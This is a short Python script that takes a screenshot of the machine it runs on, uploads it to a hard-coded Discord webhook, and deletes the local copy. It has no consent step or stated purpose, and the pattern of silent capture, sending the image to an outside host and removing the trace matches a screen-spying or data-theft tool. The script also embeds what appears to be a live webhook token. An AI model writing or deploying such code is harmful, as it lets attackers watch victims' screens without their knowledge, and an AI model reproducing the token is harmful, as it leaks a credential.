import requests
import pyautogui
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1410361283588395060/mPJ0jTL4XJ_uNrU25BKix8m9y89H2hymr453kBWegWFRa5Oq__-nSBI5R2dpc2XMi4Vg"

# Take one screenshot
file_name = "screenshot.png"
pyautogui.screenshot(file_name)

# Send it to Discord
with open(file_name, "rb") as f:
    requests.post(WEBHOOK_URL, files={"file": f}, data={"content": "📸 Screenshot captured!"})

# Delete local file
os.remove(file_name)
print("Done! Screenshot sent.")